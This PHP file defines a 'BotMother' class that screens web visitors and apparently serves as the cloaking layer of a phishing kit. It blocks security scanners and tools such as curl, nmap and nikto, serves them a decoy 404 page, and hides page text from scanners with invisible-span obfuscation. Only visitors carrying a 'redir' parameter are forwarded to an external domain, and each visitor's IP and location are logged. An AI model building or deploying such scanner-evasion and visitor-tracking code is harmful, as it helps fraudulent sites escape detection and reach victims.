<?php
# this file is botMother.php Enhanced botMother class with configuration file support
class BotMother {
    // Configuration settings
    private $LICENSE_KEY                = "";
    private $TEST_MODE                  = false;
    private $EXIT_BEHAVIOR              = "404"; // Options: "redirect", "404", "403", "captcha"
    private $EXIT_LINK                  = "https://google.com";
    private $USER_BEHAVIOR              = "redirect"; // Options: "same_page", "redirect"
    private $USER_REDIRECT              = "https://midas.307shredding.com"; // Redirect URL for legitimate users
    private $REQUIRE_PARAMETER_ENABLED  = true;
    private $REQUIRED_PARAMETER_NAME    = "redir";
    private $GEO_FILTER_ENABLED         = false;
    private $GEOS                       = "";
    private $RATE_LIMIT_ENABLED         = true;
    private $MAX_REQUESTS               = 30;
    private $TIME_FRAME                 = 60; // seconds
    
    // 404 Page settings
    private $PAGE_404_SETTINGS          = [];
    
    // File paths
    private $AGENTS_BLACKLIST_FILE      = "";
    private $IPS_BLACKLIST_FILE         = "";
    private $IPS_RANGE_BLACKLIST_FILE   = "";
    private $LOGS                       = "";
    private $VISITS                     = "";
    private $REQUEST_LOG                = "";
    
    // Runtime variables
    private $USER_AGENT                 = "";
    private $USER_IP                    = "";
    private $CONFIG_PATH                = "";
    
    /**
     * Constructor initializes the user agent and IP
     * 
     * @param string $configPath Path to the configuration file
     */
    public function __construct($configPath = null) {
        // Set default config path if not provided
        $this->CONFIG_PATH = $configPath ?? (__DIR__).'/botmother.config.php';
        
        // Load configuration if available
        $this->loadConfig();
        
        // Set runtime variables
        $this->USER_AGENT = isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : "";
        $this->USER_IP = $this->getIp();
        
        // Create required directories if they don't exist
        $this->ensureDirectoriesExist();
    }
    
    /**
     * Load configuration from file
     */
    public function loadConfig() {
        if (file_exists($this->CONFIG_PATH)) {
            $config = include $this->CONFIG_PATH;
            
            // General settings
            if (isset($config['test_mode'])) $this->TEST_MODE = (bool)$config['test_mode'];
            if (isset($config['license_key'])) $this->LICENSE_KEY = $config['license_key'];
            
            // Bot handling
            if (isset($config['exit_behavior'])) $this->EXIT_BEHAVIOR = $config['exit_behavior'];
            if (isset($config['exit_link'])) $this->EXIT_LINK = $config['exit_link'];
            
            // User handling
            if (isset($config['user_behavior'])) $this->USER_BEHAVIOR = $config['user_behavior'];
            if (isset($config['user_redirect'])) $this->USER_REDIRECT = $config['user_redirect'];
            
            // Required parameter settings
            if (isset($config['require_parameter'])) {
                if (isset($config['require_parameter']['enabled'])) {
                    $this->REQUIRE_PARAMETER_ENABLED = (bool)$config['require_parameter']['enabled'];
                }
                if (isset($config['require_parameter']['parameter_name'])) {
                    $this->REQUIRED_PARAMETER_NAME = $config['require_parameter']['parameter_name'];
                }
            }
            
            // Geographic filtering
            if (isset($config['geo_filter']['enabled'])) {
                $this->GEO_FILTER_ENABLED = (bool)$config['geo_filter']['enabled'];
            }
            if (isset($config['geo_filter']['allowed_countries'])) {
                $this->GEOS = $config['geo_filter']['allowed_countries'];
            }
            
            // Rate limiting
            if (isset($config['rate_limit']['enabled'])) {
                $this->RATE_LIMIT_ENABLED = (bool)$config['rate_limit']['enabled'];
            }
            if (isset($config['rate_limit']['max_requests'])) {
                $this->MAX_REQUESTS = (int)$config['rate_limit']['max_requests'];
            }
            if (isset($config['rate_limit']['time_frame'])) {
                $this->TIME_FRAME = (int)$config['rate_limit']['time_frame'];
            }
            
            // File paths
            $basePath = (__DIR__).'/';
            if (isset($config['paths'])) {
                $paths = $config['paths'];
                if (isset($paths['agents_blacklist'])) {
                    $this->AGENTS_BLACKLIST_FILE = $basePath . $paths['agents_blacklist'];
                }
                if (isset($paths['ips_blacklist'])) {
                    $this->IPS_BLACKLIST_FILE = $basePath . $paths['ips_blacklist'];
                }
                if (isset($paths['ips_range_blacklist'])) {
                    $this->IPS_RANGE_BLACKLIST_FILE = $basePath . $paths['ips_range_blacklist'];
                }
                if (isset($paths['logs'])) {
                    $this->LOGS = $basePath . $paths['logs'];
                }
                if (isset($paths['visits'])) {
                    $this->VISITS = $basePath . $paths['visits'];
                }
                if (isset($paths['request_log'])) {
                    $this->REQUEST_LOG = $basePath . $paths['request_log'];
                }
            }
            
            // Custom 404 Page
            if (isset($config['404_page'])) {
                $this->PAGE_404_SETTINGS = $config['404_page'];
            }
        }
        
        // Set defaults for file paths if they weren't set
        if (empty($this->AGENTS_BLACKLIST_FILE)) {
            $this->AGENTS_BLACKLIST_FILE = (__DIR__)."/data/AGENTS.jhn";
        }
        if (empty($this->IPS_BLACKLIST_FILE)) {
            $this->IPS_BLACKLIST_FILE = (__DIR__)."/data/IPS.jhn";
        }
        if (empty($this->IPS_RANGE_BLACKLIST_FILE)) {
            $this->IPS_RANGE_BLACKLIST_FILE = (__DIR__)."/data/IPS_RANGE.jhn";
        }
        if (empty($this->LOGS)) {
            $this->LOGS = (__DIR__)."/../bots_log.txt";
        }
        if (empty($this->VISITS)) {
            $this->VISITS = (__DIR__)."/../visits_log.txt";
        }
        if (empty($this->REQUEST_LOG)) {
            $this->REQUEST_LOG = (__DIR__)."/data/request_log.txt";
        }
    }
    
    /**
     * Ensures required directories exist
     */
    private function ensureDirectoriesExist() {
        $dirs = [
            dirname($this->AGENTS_BLACKLIST_FILE),
            dirname($this->LOGS),
            dirname($this->VISITS),
            dirname($this->REQUEST_LOG)
        ];
        
        foreach (array_unique($dirs) as $dir) {
            if (!file_exists($dir)) {
                mkdir($dir, 0755, true);
            }
        }
        
        // Create empty files if they don't exist
        $files = [
            $this->AGENTS_BLACKLIST_FILE,
            $this->IPS_BLACKLIST_FILE,
            $this->IPS_RANGE_BLACKLIST_FILE
        ];
        
        foreach ($files as $file) {
            if (!file_exists($file)) {
                file_put_contents($file, "");
            }
        }
    }
    
    /**
     * Check if a required URL parameter exists and handle accordingly
     * 
     * @return bool True if the request should continue, false if it was handled
     */
    public function checkRequiredParameter() {
        if (!$this->REQUIRE_PARAMETER_ENABLED || $this->TEST_MODE) {
            return true; // Skip check in test mode or if disabled
        }
        
        if (!isset($_GET[$this->REQUIRED_PARAMETER_NAME])) {
            $this->killBot("Missing required parameter: {$this->REQUIRED_PARAMETER_NAME}");
            return false;
        }
        
        // Parameter exists - handle legitimate user according to configuration
        if ($this->USER_BEHAVIOR === "redirect" && !empty($this->USER_REDIRECT)) {
            $this->saveLog("Legitimate user redirected to: {$this->USER_REDIRECT}\n");
            header("location: " . $this->USER_REDIRECT);
            exit;
        }
        
        // Default behavior is to stay on the same page (do nothing)
        $this->saveLog("Legitimate user allowed to continue\n");
        return true;
    }
    
    /**
     * Text obfuscation method
     */
    public function obf($str) {
        $text = "";
        $str = str_replace("|", "", $str);
        $strarr = str_split($str);
        foreach ($strarr as $letter) {
            if ($this->isSpace($letter)) {
                $text .= " ";
            } elseif ($this->isValidLetter($letter)) {
                $text .= $this->getCrypt().$letter.$this->getCrypt();
            } else {
                $text .= $letter;
            }
        }
        return $text;
    }
    
    /**
     * Echo obfuscated text
     */
    public function echoObf($str) {
        echo $this->obf($str);
    }
    
    /**
     * Check if a character is whitespace
     */
    private function isSpace($ltr) {
        return preg_match('/\s+/', $ltr);
    }
    /**
     * Check if a character is a valid letter/number/dot
     */
    private function isValidLetter($ltr) {
        return preg_match('/^[\w\.]+$/', $ltr);
    }
    /**
     * Generate cryptographic span for obfuscation
     */
    private function getCrypt() {
        return '<span style="padding:0 !important; margin:0 !important; display:inline-block !important; width:0 !important; height:0 !important; font-size:0 !important;">'.substr(md5(uniqid()),0,1).'</span>';
    }
    
    /**
     * Check if JavaScript is enabled via cookie
     */
    public function checkFingerprint() {
        if (empty($_COOKIE['js_enabled'])) {
            $this->killBot("No JS support (likely bot)");
        }
    }
    
    /**
     * Validate HTTP headers to detect bots
     */
    public function validateHeaders() {
        $agent = strtolower($this->USER_AGENT);
        $suspicious = [
            'python', 'curl', 'wget', 'libwww-perl', 
            'zgrab', 'nmap', 'nikto', 'dalvik',
            'scanbot', 'crawler', 'spider', 'scraper'
        ];
        
        foreach ($suspicious as $keyword) {
            if (strpos($agent, $keyword) !== false) {
                $this->killBot("Tool-based bot detected: {$keyword}");
            }
        }
        
        if (!isset($_SERVER['HTTP_ACCEPT']) || 
            strpos($_SERVER['HTTP_ACCEPT'], 'text/html') === false) {
            $this->killBot("Non-browser request");
        }
    }
    /**
     * Limit request rate for an IP address
     */
    public function limitRequests($maxRequests = null, $timeFrame = null) {
        if (!$this->RATE_LIMIT_ENABLED) {
            return;
        }
        
        // Use parameters or defaults
        $maxRequests = $maxRequests ?? $this->MAX_REQUESTS;
        $timeFrame = $timeFrame ?? $this->TIME_FRAME;
        
        // Create log file if it doesn't exist
        if (!file_exists($this->REQUEST_LOG)) {
            file_put_contents($this->REQUEST_LOG, json_encode([]));
        }
        
        $log = json_decode(file_get_contents($this->REQUEST_LOG), true);
        if (!is_array($log)) $log = []; // Handle corrupted log
        
        $now = time();
        $windowStart = $now - $timeFrame;
        // Filter out old entries
        $log = array_filter($log, function($t) use ($windowStart) { 
            return $t >= $windowStart; 
        });
        if (count($log) >= $maxRequests){
            $this->killBot("Rate limit exceeded: {$maxRequests} requests in {$timeFrame}s");
        }
        
        $log[] = $now;
        file_put_contents($this->REQUEST_LOG, json_encode($log));
    }
    /**
     * Get the visitor's IP address
     */
    public function getIp() {
        $ip = '0.0.0.0'; // Default
        
        // Check various headers for forwarded IP
        $headers = [
            'HTTP_CLIENT_IP',
            'HTTP_X_FORWARDED_FOR',
            'HTTP_X_FORWARDED', 
            'HTTP_X_CLUSTER_CLIENT_IP',
            'HTTP_FORWARDED_FOR',
            'HTTP_FORWARDED',
            'REMOTE_ADDR'
        ];
        
        foreach ($headers as $header) {
            if (!empty($_SERVER[$header])) {
                $ip = $_SERVER[$header];
                // If comma-separated list, take the first IP
                if (strpos($ip, ',') !== false) {
                    $ips = explode(',', $ip);
                    $ip = trim($ips[0]);
                }
                break;
            }
        }
        
        // For test mode, normalize to localhost
        if ($this->TEST_MODE && ($ip === '127.0.0.1' || $ip === '::1')) {
            return $ip;
        } elseif ($this->TEST_MODE) {
            return '127.0.0.1';
        }
        
        return $ip;
    }
    
    /**
     * Set license key
     */
    public function setLicenseKey($key) {
        $this->LICENSE_KEY = $key;
    }
    
    /**
     * Configure geographic filtering
     */
    public function setGeoFilter($countries, $enabled = true) {
        $this->GEOS = $countries;
        $this->GEO_FILTER_ENABLED = $enabled;
    }
    
    /**
     * Set exit link for redirections
     */
    public function setExitLink($link) {
        $this->EXIT_LINK = $link;
    }
    
    /**
     * Configure how to handle bot traffic
     * @param string $behavior Options: redirect, 404, 403, captcha
     */
    public function setExitBehavior($behavior) {
        $validBehaviors = ['redirect', '404', '403', 'captcha'];
        if (in_array(strtolower($behavior), $validBehaviors)) {
            $this->EXIT_BEHAVIOR = strtolower($behavior);
        }
    }
    
    /**
     * Configure how to handle legitimate user traffic
     * @param string $behavior Options: same_page, redirect
     * @param string $redirectUrl Redirect URL for legitimate users
     */
    public function setUserBehavior($behavior, $redirectUrl = '') {
        $validBehaviors = ['same_page', 'redirect'];
        if (in_array(strtolower($behavior), $validBehaviors)) {
            $this->USER_BEHAVIOR = strtolower($behavior);
            
            if ($behavior === 'redirect' && !empty($redirectUrl)) {
                $this->USER_REDIRECT = $redirectUrl;
            }
        }
    }
    
    /**
     * Configure required parameter settings
     * @param bool $enabled Whether to enable parameter checking
     * @param string $paramName The name of the required parameter
     */
    public function setRequiredParameter($enabled, $paramName = 'redir') {
        $this->REQUIRE_PARAMETER_ENABLED = (bool)$enabled;
        if (!empty($paramName)) {
            $this->REQUIRED_PARAMETER_NAME = $paramName;
        }
    }
    
    /**
     * Enable/disable test mode
     */
    public function setTestMode($status) {
        $this->TEST_MODE = (bool)$status;
    }
    
    /**
     * Configure rate limiting
     */
    public function setRateLimit($enabled, $maxRequests = 30, $timeFrame = 60) {
        $this->RATE_LIMIT_ENABLED = (bool)$enabled;
        $this->MAX_REQUESTS = $maxRequests;
        $this->TIME_FRAME = $timeFrame;
    }
    
    /**
     * Apply geographic filtering
     */
    public function geoFilter() {
        if (!$this->GEO_FILTER_ENABLED || trim($this->GEOS) == "") {
            return; // Skip if disabled or empty
        }
        
        $list = array_map('trim', explode(",", $this->GEOS));
        $country = $this->getIpInfo("countryCode");
        
        if (!in_array($country, $list)) {
            $this->killBot("Geo not matching filter: {$country} not in allowed list");
        }
    }
    /**
     * Get information about the visitor's IP
     */
    public function getIpInfo($data) {
        static $cache = null;
        
        // Use cache to avoid multiple API calls
        if ($cache === null) {
            $api = "http://ip-api.com/json/{$this->USER_IP}?fields=status,message,country,countryCode,region,regionName,city,timezone,currency,query,proxy,hosting";
            
            $c = curl_init($api);
            curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
            curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($c, CURLOPT_TIMEOUT, 5); // 5 second timeout
            
            $res = curl_exec($c);
            $cache = json_decode($res, true) ?: [];
            
            if (empty($cache) || isset($cache['status']) && $cache['status'] !== 'success') {
                // Fallback default values if API fails
                $cache = [
                    'country' => 'Unknown',
                    'countryCode' => 'XX',
                    'city' => 'Unknown',
                    'query' => $this->USER_IP
                ];
            }
        }
        
        return $cache[$data] ?? 'unknown';
    }
    /**
     * Generate a beautiful 404 page
     */
    private function generate404Page() {
        // Default settings
        $settings = [
            'title' => 'Page Not Found',
            'heading' => '404 - Page Not Found',
            'message' => 'The page you are looking for might have been removed, had its name changed, or is temporarily unavailable.',
            'button_text' => 'Go Home',
            'button_url' => '/',
            'background_color' => '#f8f9fa',
            'text_color' => '#343a40',
            'accent_color' => '#007bff'
        ];
        
        // Override with custom settings if provided
        if (!empty($this->PAGE_404_SETTINGS)) {
            foreach ($this->PAGE_404_SETTINGS as $key => $value) {
                if (isset($settings[$key])) {
                    $settings[$key] = $value;
                }
            }
        }
        
        // Create the 404 page HTML
        $html = '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>' . htmlspecialchars($settings['title']) . '</title>
    <style>
        :root {
            --bg-color: ' . $settings['background_color'] . ';
            --text-color: ' . $settings['text_color'] . ';
            --accent-color: ' . $settings['accent_color'] . ';
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 2rem;
            line-height: 1.6;
        }
        
        .container {
            max-width: 800px;
            text-align: center;
            padding: 2rem;
            animation: fadeIn 0.5s ease-out;
        }
        
        .error-code {
            font-size: 8rem;
            font-weight: 700;
            margin-bottom: 1rem;
            color: var(--accent-color);
            position: relative;
            display: inline-block;
        }
        
        .error-code:after {
            content: "";
            position: absolute;
            width: 100%;
            height: 3px;
            background-color: var(--accent-color);
            bottom: 8px;
            left: 0;
            opacity: 0.5;
        }
        
        h1 {
            font-size: 2.5rem;
            margin-bottom: 1.5rem;
            color: var(--text-color);
        }
        
        p {
            font-size: 1.2rem;
            margin-bottom: 2.5rem;
            max-width: 600px;
            margin-left: auto;
            margin-right: auto;
        }
        
        .back-home {
            display: inline-block;
            padding: 0.8rem 1.8rem;
            background-color: var(--accent-color);
            color: white;
            text-decoration: none;
            border-radius: 4px;
            font-weight: 500;
            transition: all 0.3s ease;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        
        .back-home:hover {
            background-color: transparent;
            color: var(--accent-color);
            border: 1px solid var(--accent-color);
            transform: translateY(-2px);
        }
        
        .illustration {
            width: 100%;
            max-width: 400px;
            margin: 0 auto 2rem;
        }
        
        .astronaut {
            width: 140px;
            height: 140px;
            margin: 0 auto 1.5rem;
            background-color: var(--accent-color);
            border-radius: 50%;
            position: relative;
            animation: float 6s ease-in-out infinite;
        }
        
        .astronaut::before {
            content: "";
            position: absolute;
            background-color: var(--bg-color);
            width: 65px;
            height: 65px;
            border-radius: 50%;
            top: 30px;
            left: 30px;
        }
        
        @keyframes float {
            0% {
                transform: translateY(0px);
            }
            50% {
                transform: translateY(-20px);
            }
            100% {
                transform: translateY(0px);
            }
        }
        
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        @media (max-width: 768px) {
            .error-code {
                font-size: 6rem;
            }
            
            h1 {
                font-size: 2rem;
            }
            
            p {
                font-size: 1rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="astronaut"></div>
        <div class="error-code">404</div>
        <h1>' . htmlspecialchars($settings['heading']) . '</h1>
        <p>' . htmlspecialchars($settings['message']) . '</p>
        <a href="' . htmlspecialchars($settings['button_url']) . '" class="back-home">' . htmlspecialchars($settings['button_text']) . '</a>
    </div>
</body>
</html>';
        return $html;
    }
    /**
     * Handle bot detection based on configured behavior
     */
    public function killBot($log) {
        $this->saveLog("Bot blocked [{$this->USER_IP}] REASON: {$log}\n");
        
        switch ($this->EXIT_BEHAVIOR) {
            case '404':
                header($_SERVER["SERVER_PROTOCOL"] . " 404 Not Found");
                echo $this->generate404Page();
                exit;
                
            case '403':
                header($_SERVER["SERVER_PROTOCOL"] . " 403 Forbidden");
                echo "<h1>403 Forbidden</h1><p>You don't have permission to access this resource.</p>";
                exit;
                
            case 'captcha':
                // Simple captcha challenge (can be enhanced)
                echo "<h1>Verify You're Human</h1>";
                echo "<p>Please complete this challenge to continue:</p>";
                echo "<form method='post'>";
                echo "<p>What is 7 + 3? <input type='text' name='captcha_answer'></p>";
                echo "<input type='submit' value='Submit'>";
                echo "</form>";
                exit;
                
            case 'redirect':
            default:
                if (empty($this->EXIT_LINK)) {
                    $this->EXIT_LINK = "https://google.com";
                }
                header("location: " . $this->EXIT_LINK);
                exit;
        }
    }
    
    /**
     * Save log entry
     */
    public function saveLog($log) {
        $timestamp = date('Y-m-d H:i:s');
        $logEntry = "[{$timestamp}] {$log}";
        
        if (!file_exists(dirname($this->LOGS))) {
            mkdir(dirname($this->LOGS), 0755, true);
        }
        
        file_put_contents($this->LOGS, $logEntry, FILE_APPEND);
    }
    /**
     * Log successful visitor
     */
    public function saveHit() {
        $timestamp = date('Y-m-d H:i:s');
        $countryCode = $this->getIpInfo("countryCode");
        $country = $this->getIpInfo("country");
        $city = $this->getIpInfo("city");
        $ip = $this->getIpInfo("query");
        
        $logEntry = "[{$timestamp}] Visit from [{$ip} - {$countryCode} - {$country} - {$city}]\n";
        
        if (!file_exists(dirname($this->VISITS))) {
            mkdir(dirname($this->VISITS), 0755, true);
        }
        
        file_put_contents($this->VISITS, $logEntry, FILE_APPEND);
    }
    /**
     * Convert file to array
     */
    private function fileToArray($filename) {
        if (!file_exists($filename)) {
            return [];
        }
        
        $file_content = file_get_contents($filename);
        $file_arr = array_filter(array_map('trim', explode(",", $file_content)));
        return $file_arr;
    }
    /**
     * Block suspicious user agents
     */
    public function blockByAgents() {
        $agents = $this->fileToArray($this->AGENTS_BLACKLIST_FILE);
        foreach ($agents as $agent) {
            if (stripos($this->USER_AGENT, $agent) !== false) {
                $this->killBot("Blacklisted user agent: {$agent}");
            }
        }
    }
    /**
     * Block specific IP addresses
     */
    public function blockByIps() {
        $ips = $this->fileToArray($this->IPS_BLACKLIST_FILE);
        foreach ($ips as $ip) {
            if ($this->USER_IP == $ip) {
                $this->killBot("Blacklisted IP matched: {$ip}");
            }
        }
    }
    /**
     * Block IP ranges
     */
    public function blockByIpsRange() {
        $ips_range = $this->fileToArray($this->IPS_RANGE_BLACKLIST_FILE);
        foreach ($ips_range as $ip_range) {
            if (strpos($this->USER_IP, $ip_range) !== false) {
                $this->killBot("Blacklisted IP range matched: {$ip_range}");
            }
        }
    }
    /**
     * Run all checks
     */
    public function run() {
        if ($this->TEST_MODE) {
            $this->saveLog("Test mode enabled - skipping most checks\n");
            return;
        }
        
        $this->blockByAgents();
        $this->blockByIps();
        $this->blockByIpsRange();
        $this->geoFilter();
        
        // Success!
        $this->saveHit();
    }
}
?>